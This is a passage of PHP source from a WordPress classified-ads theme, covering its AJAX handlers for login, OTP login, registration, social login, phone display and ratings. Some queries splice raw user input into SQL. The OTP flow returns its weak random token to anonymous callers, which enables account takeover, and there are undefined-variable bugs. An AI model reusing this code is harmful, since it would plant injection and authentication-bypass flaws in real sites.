                'parent' => $params['parent_comment_id'],
            );
            $comment_exist = get_comments($args);
            if (count($comment_exist) > 0) {
                $comment = array();
                $comment['comment_ID'] = $comment_exist[0]->comment_ID;
                $comment['comment_content'] = $params['reply_comments'];
                wp_update_comment($comment);

                if (isset($adforest_theme['sb_rating_reply_email']) && $adforest_theme['sb_rating_reply_email']) {
                    $comment_data = get_comment($params['parent_comment_id']);
                    $rating = get_comment_meta($params['parent_comment_id'], 'review_stars', true);
                    adforest_email_ad_rating_reply($params['ad_id'], $comment_data->user_id, $params['reply_comments'], $rating, $comment_data->comment_content);
                }
                echo '1|' . __("Your reply has been updated.", 'adforest');
                die();
            }

            //$time = current_time('mysql');
            $time = date('Y-m-d H:i:s');

            $data = array(
                'comment_post_ID' => $params['ad_id'],
                'comment_author' => $sender->display_name,
                'comment_author_email' => $sender->user_email,
                'comment_author_url' => '',
                'comment_content' => $params['reply_comments'],
                'comment_type' => 'ad_post_rating',
                'user_id' => $sender_id,
                'comment_author_IP' => $_SERVER['REMOTE_ADDR'],
                'comment_date' => $time,
                'comment_parent' => $params['parent_comment_id'],
                'comment_approved' => 1
            );

            $comment_id = wp_insert_comment($data);
            if ($comment_id) {
                if (isset($adforest_theme['sb_rating_reply_email']) && $adforest_theme['sb_rating_reply_email']) {
                    $comment_data = get_comment($params['parent_comment_id']);
                    $rating = get_comment_meta($params['parent_comment_id'], 'review_stars', true);
                    adforest_email_ad_rating_reply($params['ad_id'], $comment_data->user_id, $params['reply_comments'], $rating, $comment_data->comment_content);
                }
                echo '1|' . __("Your reply has been posted.", 'adforest');
                die();
            }
        }
    }

}
add_action('wp_ajax_sb_display_phone_num', 'sb_display_phone_num_callback');
add_action('wp_ajax_nopriv_sb_display_phone_num', 'sb_display_phone_num_callback');

if (!function_exists('sb_display_phone_num_callback')) {

    function sb_display_phone_num_callback() {
        global $adforest_theme;

        $pid = isset($_POST['ad_id']) && $_POST['ad_id'] != '' ? $_POST['ad_id'] : 0;
        if ($pid != 0) {
            $contact_num = '';
            if ($adforest_theme['communication_mode'] == 'both' || $adforest_theme['communication_mode'] == 'phone') {
                $contact_num = get_post_meta($pid, '_adforest_poster_contact', true);
                if (isset($adforest_theme['sb_phone_verification']) && $adforest_theme['sb_phone_verification']) {
                    $contact_num = get_user_meta($poster_id, '_sb_contact', true);
                    $contact_num = isset($contact_num) && $contact_num != '' ? $contact_num : '';
                    if ($contact_num == "") {
                        $contact_num = get_post_meta($pid, '_adforest_poster_contact', true);
                    }
                }
            }
            if ($contact_num != '') {
                echo '1|' . $contact_num;
                wp_die();
            } else {
                echo '0|' . __('There is no added phone number.', 'adforest');
                wp_die();
            }
        } else {
            echo '0|' . __('There is no ad id.', 'adforest');
            wp_die();
        }
    }

}
/* Rearrange images */
add_action('wp_ajax_sb_sort_images', 'adforest_sort_images');
if (!function_exists('adforest_sort_images')) {

    function adforest_sort_images() {
        update_post_meta($_POST['ad_id'], '_sb_photo_arrangement_', $_POST['ids']);
        die();
    }

}



/* Login user on the otp verification / by user phone number */
add_action('wp_ajax_nopriv_sb_login_user_with_otp', 'sb_login_user_with_otp_fun');
if (!function_exists('sb_login_user_with_otp_fun')) {

    function sb_login_user_with_otp_fun() {
        global $wpdp;

        $is_demo = adforest_is_demo();

        if ($is_demo) {
            wp_send_json_error(array("message" => esc_html__('Not allowed in demo mode', 'adforest')));
            die();
        }

        $form_data = isset($_POST['form_data']) ? $_POST['form_data'] : "";
        $param = array();
        parse_str($form_data, $param);
        $user_name = isset($param['sb_reg_name']) ? $param['sb_reg_name'] : "";
        $user_id = isset($_POST['user_id']) ? $_POST['user_id'] : "";
        if ($user_id == "") {
            wp_send_json_error(array("message" => esc_html__('Something went wrong', 'adforest')));
            die();
        }
        $token = isset($_POST['token']) ? $_POST['token'] : "";
        $saved_token = get_user_meta($user_id, 'secure_token', true);
        if ($token != $saved_token) {
            wp_send_json_error(array("message" => esc_html__('Something went wrong', 'adforest')));
            die();
        }
        $user = get_user_by('ID', $user_id);
        $user_id = isset($user->ID) ? $user->ID : "";
        if ($user_id != "") {
            wp_set_current_user($user_id, $user->user_login);
            wp_set_auth_cookie($user_id);
            wp_send_json_success(array("message" => esc_html__('You are successfully logged in', 'adforest')));
        }
        wp_send_json_error(array("message" => esc_html__('Something went wrong', 'adforest')));
    }

}




// Ajax handler for Login User
add_action('wp_ajax_sb_login_user', 'adforest_login_user');
add_action('wp_ajax_nopriv_sb_login_user', 'adforest_login_user');

// Login User
if (!function_exists('adforest_login_user')) {

    function adforest_login_user() {
        global $adforest_theme;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            //  echo esc_html__('Not allowed in demo mode', 'adforest');
            //  die();
        }
        // Getting values
        $params = array();
        parse_str($_POST['sb_data'], $params);
        check_ajax_referer('sb_login_secure', 'security');
        $remember = false;
        if (isset($params['is_remember']) && $params['is_remember']) {
            $remember = true;
        }

        $user = wp_authenticate($params['sb_reg_email'], $params['sb_reg_password']);

        if (!is_wp_error($user)) {
            if (count($user->roles) == 0) {
                echo __('Your account is not verified yet.', 'adforest');
                die();
            } else {
                $res = adforest_auto_login($params['sb_reg_email'], $params['sb_reg_password'], $remember);
                if ($res == 1) {
                    echo "1";
                }
            }
        } else {
            if (is_wp_error($user)) {
                echo adforest_returnEcho($user->get_error_message());
                die();
            } else {
                echo __('Invalid email or password.', 'adforest');
            }
        }
        die();
    }

}

if (!function_exists('adforest_auto_login')) {

    function adforest_auto_login($username, $password, $remember) {
        $creds = array();
        $creds['user_login'] = $username;
        $creds['user_password'] = $password;
        $creds['remember'] = $remember;

        $user = wp_signon($creds, false);
        if (is_wp_error($user)) {
            return false;
        } else {
            //global $adforest_theme;
            //if( isset( $adforest_theme['sb_new_user_email_verification'] ) && $adforest_theme['sb_new_user_email_verification'] )
            //{
            if (count($user->roles) > 0) {


                /* ======= This code is add when we face issue vendor upload image ====== */
                $user_id = $user->ID;
                wp_set_current_user($user_id, $user->user_login);
                wp_set_auth_cookie($user_id, $remember);

                /* ============ */
                return true;
            } else {
                return 2;
            }
            //}
        }
    }

}
/* check if user name exist or number belong to that user */
add_action('wp_ajax_nopriv_sb_login_check_user', 'sb_login_check_user_func');
if (!function_exists('sb_login_check_user_func')) {

    function sb_login_check_user_func() {
        global $wpdb;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            wp_send_json_error(array("message" => esc_html__('Not allowed in demo mode', 'adforest')));
            die();
        }

        $form_data = isset($_POST['form_data']) ? $_POST['form_data'] : "";
        $param = array();
        parse_str($form_data, $param);
        $user_contact = isset($param['sb_reg_email']) ? $param['sb_reg_email'] : "";
        if ($user_contact == "") {
            wp_send_json_error(array("message" => esc_html__('Please Enter Valid Phone Number', 'adforest')));
            die();
        }
        $query = "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '_sb_contact' AND meta_value  =  '$user_contact'";
        $result = $wpdb->get_results($query);

        if (isset($result) && !empty($result)) {
            $user_id = isset($result[0]->user_id) ? $result[0]->user_id : "";
            if ($user_id != "") {
                $secure_token = mt_rand(0, 1000);
                update_user_meta($user_id, 'secure_token', $secure_token);
                wp_send_json_success(array("message" => '', 'user_id' => $user_id, 'secure_token' => $secure_token));
                die();
            }
        }
        wp_send_json_error(array("message" => esc_html__('Phone Number not Registered', 'adforest')));
        die();
    }

}



// Register User
add_action('wp_ajax_sb_register_user', 'adforest_register_user');
add_action('wp_ajax_nopriv_sb_register_user', 'adforest_register_user');

if (!function_exists('adforest_register_user')) {

    function adforest_register_user() {
        global $adforest_theme;
        global $wpdb;
        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo esc_html__('Not allowed in demo mode', 'adforest');
            die();
        }
        // Getting values
        $params = array();
        parse_str($_POST['sb_data'], $params);
        check_ajax_referer('sb_register_secure', 'security');
        if (email_exists($params['sb_reg_email']) == false) {
            if (isset($params['sb_reg_contact']) && $params['sb_reg_contact'] != "") {
                $user_contact = $params['sb_reg_contact'];
                $query_user = "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '_sb_contact' AND meta_value  =  '$user_contact'";
                $result = $wpdb->get_results($query_user);
                if (isset($result) && !empty($result)) {
                    echo __('Phone Number already registered', 'adforest');
                    die();
                }
            }
            $google_captcha_auth = false;

            //$grecaptchta_rsp = isset($params['g-recaptcha-response']) && $params['g-recaptcha-response'] != '' ? $params['g-recaptcha-response'] : '';
            //if($grecaptchta_rsp != ''){
            $google_captcha_auth = adforest_recaptcha_verify($adforest_theme['google_api_secret'], $params['g-recaptcha-response'], $_SERVER['REMOTE_ADDR'], $params['is_captcha']);
            //}

            $captcha_type = isset($adforest_theme['google-recaptcha-type']) && !empty($adforest_theme['google-recaptcha-type']) ? $adforest_theme['google-recaptcha-type'] : 'v2';

            if ($google_captcha_auth) {

                $user_name = explode('@', $params['sb_reg_email']);

                $other_errors = adforest_before_register_new_user($user_name[0], $params['sb_reg_email']);

                if ($other_errors) {
                    echo adforest_returnEcho($other_errors);
                    die();
                }
                $u_name = adforest_check_user_name($user_name[0]);
                $uid = wp_create_user($u_name, $params['sb_reg_password'], sanitize_email($params['sb_reg_email']));

                if (isset($adforest_theme['subscriber_checkbox_on_register']) && $adforest_theme['subscriber_checkbox_on_register'] == true) {
                    if (isset($params['minimal-subscriber-1'])) {
                        do_action('adforest_subscribe_newsletter_on_regisster', $adforest_theme, $uid);
                    }
                } else {
                    do_action('adforest_subscribe_newsletter_on_regisster', $adforest_theme, $uid);
                }
                $display_name = isset($params['sb_reg_name']) ? sanitize_text_field($params['sb_reg_name']) : $u_name;

                wp_update_user(array('ID' => $uid, 'display_name' => $display_name));
                $contact_number = isset($params['sb_reg_contact']) ? sanitize_text_field($params['sb_reg_contact']) : "";
                update_user_meta($uid, '_sb_contact', $params['sb_reg_contact']);

                if ($adforest_theme['sb_allow_ads']) {
                    update_user_meta($uid, '_sb_simple_ads', $adforest_theme['sb_free_ads_limit']);
                    if ($adforest_theme['sb_allow_featured_ads']) {
                        update_user_meta($uid, '_sb_featured_ads', $adforest_theme['sb_featured_ads_limit']);
                    }
                    if ($adforest_theme['sb_allow_bump_ads']) {
                        update_user_meta($uid, '_sb_bump_ads', $adforest_theme['sb_bump_ads_limit']);
                    }
                    
                    if ($adforest_theme['sb_package_validity'] == '-1') {
                        update_user_meta($uid, '_sb_expire_ads', $adforest_theme['sb_package_validity']);
                    } else {
                        $days = $adforest_theme['sb_package_validity'];
                        $expiry_date = date('Y-m-d', strtotime("+$days days"));
                        update_user_meta($uid, '_sb_expire_ads', $expiry_date);
                    }  


                       if ($adforest_theme['simple_ad_removal'] != '') {
                        update_user_meta($uid, 'package_ad_expiry_days', $adforest_theme['simple_ad_removal']);
                        }

                      if ($adforest_theme['featured_expiry'] != '') {
                        update_user_meta($uid, 'package_adFeatured_expiry_days', $adforest_theme['featured_expiry']);
                        }
    
                     if(isset($adforest_theme['sb_free_events_limit']) && $adforest_theme['sb_free_events_limit'] != ""){
                         update_user_meta($uid, 'number_of_events', $adforest_theme['sb_free_events_limit']);
                     }
                } 



                else {
                    update_user_meta($uid, '_sb_simple_ads', 0);
                    update_user_meta($uid, '_sb_featured_ads', 0);
                    update_user_meta($uid, '_sb_bump_ads', 0);
                    update_user_meta($uid, '_sb_expire_ads', date('Y-m-d'));
                }

                $is_free_video = isset($adforest_theme['sb_allow_free_video_url']) ? $adforest_theme['sb_allow_free_video_url'] : false;
                $is_free_tags = isset($adforest_theme['sb_allow_free_tags']) ? $adforest_theme['sb_allow_free_tags'] : false;

                if ($is_free_video) {
                    update_user_meta($uid, '_sb_video_links', "yes");
                }
                if ($is_free_tags) {
                    update_user_meta($uid, '_sb_allow_tags', "yes");
                }
                update_user_meta($uid, '_sb_pkg_type', 'free');
                // Email for new user
                if (function_exists('adforest_email_on_new_user')) {
                    adforest_email_on_new_user($uid, '');
                }
                // check phone verification is on or not
                // check phone verification is on or not
                $sms_gateway = adforest_verify_sms_gateway();
                if ($sms_gateway != "") {
                    update_user_meta($uid, '_sb_is_ph_verified', '0');
                }

                /* if (isset($adforest_theme['sb_phone_verification']) && $adforest_theme['sb_phone_verification'] && in_array('wp-twilio-core/core.php', apply_filters('active_plugins', get_option('active_plugins')))) {
                  update_user_meta($uid, '_sb_is_ph_verified', '0');
                  } */

                if (isset($adforest_theme['sb_new_user_email_verification']) && $adforest_theme['sb_new_user_email_verification']) {
                    $user = new WP_User($uid);
                    // Remove all user roles after registration
                    foreach ($user->roles as $role) {
                        $user->remove_role($role);
                    }
                    echo 2;
                    die();
                } else if ($adforest_theme['sb_admin_approve_user'] && $adforest_theme['sb_admin_approve_user']) {

                    $user = new WP_User($uid);
                    // Remove all user roles after registration
                    foreach ($user->roles as $role) {
                        $user->remove_role($role);
                    }
                    echo 3;
                    die();
                } else {
                    adforest_auto_login($params['sb_reg_email'], $params['sb_reg_password'], true);
                    echo 1;
                    die();
                }
            } else {

                if ($captcha_type == 'v3') {
                    echo __('You are spammer ! Get out.', 'adforest');
                } else {
                    echo __('please verify captcha code', 'adforest');
                }
                die();
            }
        } else {
            echo __('Email already exist, please try other one.', 'adforest');
            die();
        }
        die();
    }

}

/* verify recaptcha */
// Goog re-capthca verification
if (!function_exists('adforest_recaptcha_verify')) {

    function adforest_recaptcha_verify($api_secret, $code, $ip, $is_captcha) {

        global $adforest_theme;
        $captcha_status = false;
        $captcha_type = isset($adforest_theme['google-recaptcha-type']) && !empty($adforest_theme['google-recaptcha-type']) ? $adforest_theme['google-recaptcha-type'] : 'v2';
        if ($is_captcha == 'no') {
            return true;
        }
        if ($captcha_type == 'v3') {
            return true;
        } else {
            $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . $api_secret . '&response=' . $code . '&remoteip=' . $ip;
            $responseData = wp_remote_get($url);
            $res = json_decode($responseData['body'], true);
            if ($res["success"] === true) {
                $captcha_status = true;
            } else {
                $captcha_status = false;
            }
        }
        return $captcha_status;
    }

}

if (!function_exists('adforest_before_register_new_user')) {

    function adforest_before_register_new_user($user_login, $user_email) {
        $errors = new WP_Error();
        $sanitized_user_login = sanitize_user($user_login);
        $user_email = apply_filters('user_registration_email', $user_email);
        do_action('register_post', $sanitized_user_login, $user_email, $errors);
        $errors = apply_filters('registration_errors', $errors, $sanitized_user_login, $user_email);
        if ($errors->has_errors()) {
            return $errors->get_error_message();
        }
    }

}
if (!function_exists('adforest_check_user_name')) {

    function adforest_check_user_name($username = '') {
        if (username_exists($username)) {
            $random = mt_rand();
            $username = $username . '-' . $random;
            adforest_check_user_name($username);
        }
        return $username;
    }

}


add_action('wp_ajax_sb_register_user_with_otp', 'sb_register_user_with_otp_fun');
add_action('wp_ajax_nopriv_sb_register_user_with_otp', 'sb_register_user_with_otp_fun');

if (!function_exists('sb_register_user_with_otp_fun')) {

    function sb_register_user_with_otp_fun() {

        global $wpdp;
        global $adforest_theme;

        $is_demo = adforest_is_demo();

        if ($is_demo) {
            wp_send_json_error(array("message" => esc_html__('Not allowed in demo mode', 'adforest')));
            die();
        }
        $form_data = isset($_POST['form_data']) ? $_POST['form_data'] : "";
        $param = array();
        parse_str($form_data, $param);

        $random = mt_rand(0, 1000);
        // $user_name = isset($adforest_theme['sb_register_user_txt']) ? $adforest_theme['sb_register_user_txt'] : "user";
        // $user_name = $user_name . '-' . $random;        

        $user_name = isset($param['sb_reg_name']) ? $param['sb_reg_name'] : "";

        $user_name = adforest_check_user_name($user_name);

        $contact_number = isset($param['sb_reg_email']) ? $param['sb_reg_email'] : "";
        if ($user_name == "") {
            wp_send_json_error(array("message" => esc_html__('Please Enter user name', 'adforest')));
            die();
        }
        if (username_exists($user_name)) {
            wp_send_json_error(array("message" => esc_html__('User Name already exist', 'adforest')));
            die();
        }
        $info = array();
        $info['user_login'] = $user_name;
        $info['user_nicename'] = $user_name;
        $info['user_pass'] = wp_generate_password(12);
        $user_id = wp_insert_user($info);
        if (is_wp_error($user_id)) {
            wp_send_json_error(array("message" => $user_id->get_error_message()));
            die();
        }


        $saved_num = update_user_meta($user_id, '_sb_contact', $contact_number);
        if (function_exists('adforest_email_on_new_user')) {
            adforest_email_on_new_user($user_id, '');
        }



        global $adforest_theme;
        if ($adforest_theme['sb_allow_ads']) {
            update_user_meta($user_id, '_sb_simple_ads', $adforest_theme['sb_free_ads_limit']);
            if ($adforest_theme['sb_allow_featured_ads']) {
                update_user_meta($user_id, '_sb_featured_ads', $adforest_theme['sb_featured_ads_limit']);
            }
            if ($adforest_theme['sb_allow_bump_ads']) {
                update_user_meta($user_id, '_sb_bump_ads', $adforest_theme['sb_bump_ads_limit']);
            }
            if ($adforest_theme['sb_package_validity'] == '-1') {
                update_user_meta($user_id, '_sb_expire_ads', $adforest_theme['sb_package_validity']);
            } else {
                $days = $adforest_theme['sb_package_validity'];
                $expiry_date = date('Y-m-d', strtotime("+$days days"));
                update_user_meta($user_id, '_sb_expire_ads', $expiry_date);
            }


                   if ($adforest_theme['simple_ad_removal'] != '') {
                        update_user_meta($uid, 'package_ad_expiry_days', $adforest_theme['simple_ad_removal']);
                        }

                      if ($adforest_theme['featured_expiry'] != '') {
                        update_user_meta($uid, 'package_adFeatured_expiry_days', $adforest_theme['featured_expiry']);
                        }
    
                     if(isset($adforest_theme['sb_free_events_limit']) && $adforest_theme['sb_free_events_limit'] != ""){
                         update_user_meta($uid, 'number_of_events', $adforest_theme['sb_free_events_limit']);
                     }
       

        } else {
            update_user_meta($user_id, '_sb_simple_ads', 0);
            update_user_meta($user_id, '_sb_featured_ads', 0);
            update_user_meta($user_id, '_sb_bump_ads', 0);
            update_user_meta($user_id, '_sb_expire_ads', date('Y-m-d'));
        }

        update_user_meta($user_id, '_sb_pkg_type', 'free');

        // check phone verification is on or not
        // check phone verification is on or not

        update_user_meta($user_id, '_sb_is_ph_verified', '1');

        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        wp_send_json_success(array("message" => esc_html__('User Registered Succesfully', 'adforest')));
    }

}




add_action('wp_ajax_sb_sb_register_check_user', 'sb_register_check_user_fun');
add_action('wp_ajax_nopriv_sb_register_check_user', 'sb_register_check_user_fun');
if (!function_exists('sb_register_check_user_fun')) {

    function sb_register_check_user_fun() {

        global $wpdb;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            wp_send_json_error(array("message" => esc_html__('Not allowed in demo mode', 'adforest')));
            die();
        }

        $form_data = isset($_POST['form_data']) ? $_POST['form_data'] : "";
        $param = array();
        parse_str($form_data, $param);
        $user_contact = isset($param['sb_reg_email']) ? $param['sb_reg_email'] : "";

        $query = "SELECT user_id FROM $wpdb->usermeta WHERE meta_key = '_sb_contact' AND meta_value  =  '$user_contact'";
        $result = $wpdb->get_results($query);

        if (isset($result) && !empty($result)) {
            wp_send_json_error(array("message" => esc_html__('Phone Number already registered', 'adforest')));
            die();
        }

        wp_send_json_success(array("message" => esc_html__('No such user name exist', 'adforest')));
        die();
    }

}



// Ajax handler for Social login
add_action('wp_ajax_sb_social_login', 'adforest_check_social_user');
add_action('wp_ajax_nopriv_sb_social_login', 'adforest_check_social_user');
if (!function_exists('adforest_check_social_user')) {

    function adforest_check_social_user() {
        $is_demo = adforest_is_demo();

        if ($is_demo) {
            echo '0|error|Invalid request|' . __("Not allowed in demo mode", 'adforest');
            die();
        }

        check_ajax_referer('sb_social_login_nonce', 'security');
        $network = (isset($_POST['sb_network'])) ? $_POST['sb_network'] : '';
        $response_response = false;
        $user_name = "";
        if ($network == 'facebook') {
            $access_token = (isset($_POST['access_token'])) ? $_POST['access_token'] : '';
           
            $token_verify = wp_remote_get("https://graph.facebook.com/me?fields=name,email&access_token=$access_token");

            
            
            if (isset($token_verify['response']['code']) && $token_verify['response']['code'] == '200') {
                $info = (json_decode($token_verify['body']));
                if (isset($_POST['email']) && isset($token_verify['body'])) {
                    if (isset($info->email) && $info->email == $_POST['email']) {
                        $user_name = $info->email;
                        $response_response = true;
                    }
                }
            }
        } else if ($network == 'google') {
            $access_token = (isset($_POST['access_token'])) ? $_POST['access_token'] : '';
            $token_verify = wp_remote_get("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$access_token");
            if (isset($token_verify['response']['code']) && $token_verify['response']['code'] == '200') {
                $info = (json_decode($token_verify['body']));
                if (isset($_POST['email']) && isset($token_verify['body'])) {
                    if (isset($info->email) && $info->email == $_POST['email']) {
                        $user_name = $info->email;
                        $response_response = true;
                    }
                }
            }
        }
        if ($response_response == false) {
            echo '0|error|Invalid request|' . __("Authentication Fialed.", 'adforest');
            die();
        }
        if ($response_response == true) {
            unset($_SESSION['sb_nonce']);
            $_SESSION['sb_nonce'] = time();
            if ($user_name == "") {
                echo '1|' . $_SESSION['sb_nonce'] . '|0|' . __("We are unable to get your email.", 'adforest');
                die();
            }
            if (email_exists($user_name) == true) {
                $user = get_user_by('email', $user_name);
                $user_id = $user->ID;

                if ($user) {
                    if (count($user->roles) == 0) {

                        echo '1|' . $_SESSION['sb_nonce'] . '|0|' . __("Your account is not verified yet", 'adforest');
                        die();
                    }


                    wp_clear_auth_cookie();
                    wp_set_current_user($user_id, $user->user_login);
                    wp_set_auth_cookie($user_id);
                    //do_action( 'wp_login', $user->user_login );
                    echo '1|' . $_SESSION['sb_nonce'] . '|1|' . __("You're logged in successfully", 'adforest');
                }
            } else {


                $user_username = explode('@', $user_name);
                $other_errors = adforest_before_register_new_user($user_username[0], $user_name);
                if ($other_errors) {
                    echo '0|error|Invalid request|' . $other_errors;
                    //echo $other_errors;
                    die();
                }
                // Here we need to register user.
                $password = mt_rand(1000, 10000);

                $uid = adforest_do_register($user_name, $password);

                if (filter_var($uid, FILTER_VALIDATE_INT) === false) {
                    echo '0|error|Invalid request|' . __("Something went wrong.", 'adforest');
                } else {
                    global $adforest;
                    if (function_exists('adforest_email_on_new_social_user')) {
                        adforest_email_on_new_social_user($uid, $password);
                    }
                    echo '1|' . $_SESSION['sb_nonce'] . '|1|' . __("You're registered and logged in successfully.", 'adforest');
                }
            }
        } else {
            echo '0|error|Invalid request|Diret Access not allowed';
        }
        die();
    }

}

if (!function_exists('adforest_do_register')) {

    function adforest_do_register($email = '', $password = '') {
        global $adforest_theme;
        if (email_exists($email) == false) {
            $user_name = explode('@', $email);
            $u_name = adforest_check_user_name($user_name[0]);
            $uid = wp_create_user($u_name, $password, $email);

            if (is_wp_error($uid)) {
                return $uid->get_error_message(); // for invalid user
            }

            do_action('adforest_subscribe_newsletter_on_regisster', $adforest_theme, $uid);
            wp_update_user(array('ID' => $uid, 'display_name' => $u_name));
            adforest_auto_login($email, $password, true);

            if ($adforest_theme['sb_allow_ads']) {


                update_user_meta($uid, '_sb_simple_ads', $adforest_theme['sb_free_ads_limit']);

                if ($adforest_theme['sb_allow_featured_ads']) {
                    update_user_meta($uid, '_sb_featured_ads', $adforest_theme['sb_featured_ads_limit']);
                }


                if ($adforest_theme['sb_allow_bump_ads']) {
                    update_user_meta($uid, '_sb_bump_ads', $adforest_theme['sb_bump_ads_limit']);
                }

                if ($adforest_theme['simple_ad_removal'] != '') {
                        update_user_meta($uid, 'package_ad_expiry_days', $adforest_theme['simple_ad_removal']);
                        }

                      if ($adforest_theme['featured_expiry'] != '') {
                        update_user_meta($uid, 'package_adFeatured_expiry_days', $adforest_theme['featured_expiry']);
                        }
    





                if ($adforest_theme['sb_package_validity'] == '-1') {
                    update_user_meta($uid, '_sb_expire_ads', $adforest_theme['sb_package_validity']);
                } else {
                    $days = $adforest_theme['sb_package_validity'];
                    $expiry_date = date('Y-m-d', strtotime("+$days days"));
                    update_user_meta($uid, '_sb_expire_ads', $expiry_date);
                }

                   if(isset($adforest_theme['sb_free_events_limit']) && $adforest_theme['sb_free_events_limit'] != ""){
                         update_user_meta($uid, 'number_of_events', $adforest_theme['sb_free_events_limit']);
                     }
            } 

            else {
                update_user_meta($uid, '_sb_simple_ads', 0);
                update_user_meta($uid, '_sb_featured_ads', 0);
                update_user_meta($uid, '_sb_bump_ads', 0);
                update_user_meta($uid, '_sb_expire_ads', date('Y-m-d'));
            }
            update_user_meta($uid, '_sb_pkg_type', 'free');
            return $uid;
        }
    }

}

add_action('wp_ajax_sb_get_sub_cat_search', 'adforest_get_sub_cats_search');
add_action('wp_ajax_nopriv_sb_get_sub_cat_search', 'adforest_get_sub_cats_search');
if (!function_exists('adforest_get_sub_cats_search')) {

    function adforest_get_sub_cats_search() {
        global $adforest_theme;
        $adpost_cat_style = isset($adforest_theme['adpost_cat_style']) && $adforest_theme['adpost_cat_style'] == 'grid' ? TRUE : FALSE;
        $search_popup_cat_disable = isset($adforest_theme['search_popup_cat_disable']) ? $adforest_theme['search_popup_cat_disable'] : false;
        $cat_id = $_POST['cat_id'];
        $load_type = isset($_POST['type']) && $_POST['type'] != '' ? $_POST['type'] : '';
        if ($load_type == 'ad_post') {
            if ($adpost_cat_style) {
                $ad_cats = adforest_get_cats('ad_cats', $cat_id, 0, 'post_ad');
            } else {
                $ad_cats = adforest_get_cats('ad_cats', 0, 0, 'post_ad');
            }
        } else {
            $ad_cats = adforest_get_cats('ad_cats', $cat_id);
        }
        $res = '';
        if (count($ad_cats) > 0) {
            $selected_cats = adforest_get_taxonomy_parents($cat_id, 'ad_cats', false);
            $find = '&raquo;';
            $replace = '';
            $selected_cats = preg_replace("/$find/", $replace, $selected_cats, 1);
            $res = '<label>' . $selected_cats . '</label>';
            $res .= '<ul class="city-select-city" >';

            foreach ($ad_cats as $ad_cat) {
                $id = 'ajax_cat';
                $count_p = ($ad_cat->count);
                $term_level = adforest_get_taxonomy_depth($ad_cat->term_id, 'ad_cats');

                $count_style = ' (' . $count_p . ')';
                if ($load_type == 'ad_post') {
                    $count_style = '';
                }


                $res .= '<li class="col-sm-4 col-xs-6 margin-top-15"><a href="javascript:void(0);" data-term-level="' . $term_level . '" data-cat-id="' . esc_attr($ad_cat->term_id) . '" id="' . $id . '">' . $ad_cat->name . $count_style . '</a></li>';
            }
            $res .= '</ul>';
            echo adforest_returnEcho($res);
        } else {
            echo "submit";
        }
        die();
    }

}

add_action('wp_ajax_sb_display_phone_num_user', 'sb_display_phone_num_user_callback');
add_action('wp_ajax_nopriv_sb_display_phone_num_user', 'sb_display_phone_num_user_callback');

/* get user number */
if (!function_exists('sb_display_phone_num_user_callback')) {

    function sb_display_phone_num_user_callback() {
        global $adforest_theme;
        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __('Not allowed in demo mode', 'adforest');
            die();
        }

        $pid = isset($_POST['user_id']) && $_POST['user_id'] != '' ? $_POST['user_id'] : 0;

        if ($pid != 0) {
            $contact_num = '';

            $contact_num = get_user_meta($pid, '_sb_contact', true);

            if ($contact_num != '') {
                echo '1|' . $contact_num;
                wp_die();
            } else {
                echo '0|' . __('There is no added phone number.', 'adforest');
                wp_die();
            }
        } else {
            echo '0|' . __('There is no user id.', 'adforest');
            wp_die();
        }
    }

}

add_action('wp_ajax_sb_goggle_captcha3_verification', 'sb_goggle_captcha3_verification_callback');
add_action('wp_ajax_nopriv_sb_goggle_captcha3_verification', 'sb_goggle_captcha3_verification_callback');

if (!function_exists('sb_goggle_captcha3_verification_callback')) {

    function sb_goggle_captcha3_verification_callback() {
        global $adforest_theme;
        $google_api_secret = isset($adforest_theme['google_api_secret']) && !empty($adforest_theme['google_api_secret']) ? $adforest_theme['google_api_secret'] : '';
        $captcha;
        if (isset($_POST['token'])) {
            $captcha = $_POST['token'];
        }
        $secretKey = $google_api_secret;
        $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) . '&response=' . urlencode($captcha);
        $responseData = wp_remote_get($url);
        $data_resp = array();
        if (is_wp_error($responseData)) {
            $error_message = $responseData->get_error_message();
            $data_resp['success'] = false;
            $data_resp['msg'] = $error_message;
            echo json_encode($data_resp);
            wp_die();
        } else {
            $res = json_decode($responseData['body'], true);
            if ($res["success"]) {
                $data_resp['success'] = true;
            } else {
                $data_resp['success'] = false;
                $data_resp['msg'] = __('You are spammer ! Get out here.', 'adforest');
            }
            echo json_encode($data_resp);
            wp_die();
        }
    }

}

add_action('wp_ajax_sb_post_user_ratting', 'adforest_post_user_ratting');
add_action('wp_ajax_nopriv_sb_post_user_ratting', 'adforest_post_user_ratting');
if (!function_exists('adforest_post_user_ratting')) {

    function adforest_post_user_ratting() {

        global $adforest_theme;
        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }
        adforest_authenticate_check();
        // Getting values
        $params = array();
        parse_str($_POST['sb_data'], $params);
        check_ajax_referer('sb_user_rating_secure', 'security');
        $ratting = $params['rating'];
        $comments = sanitize_text_field($params['sb_rate_user_comments']);
        $author = $params['author'];
        $rator = get_current_user_id();

        if ($author == $rator) {
            echo '0|' . __("You can't rate yourself.", 'adforest');
            die();
        }
        if (get_user_meta($author, "_user_" . $rator, true) == "") {
            update_user_meta($author, "_user_" . $rator, $ratting . "_separator_" . $comments . "_separator_" . date('Y-m-d'));

            $ratings = adforest_get_all_ratings($author);
            $all_rattings = 0;
            $got = 0;
            if (count($ratings) > 0) {
                foreach ($ratings as $rating) {
                    $data = explode('_separator_', $rating->meta_value);
                    $got = $got + $data[0];
                    $all_rattings++;
                }
                $avg = $got / $all_rattings;
            } else {
                $avg = $ratting;
            }

            update_user_meta($author, "_adforest_rating_avg", $avg);
            $total = get_user_meta($author, "_adforest_rating_count", true);
            if ($total == "")
                $total = 0;
            $total = $total + 1;
            update_user_meta($author, "_adforest_rating_count", $total);

            // Send email if enabled
            global $adforest_theme;
            if (isset($adforest_theme['email_to_user_on_rating']) && $adforest_theme['email_to_user_on_rating']) {
                adforest_send_email_new_rating($rator, $author, $ratting, $comments);
            }


            echo '1|' . __("You've rated this user.", 'adforest');
        } else {

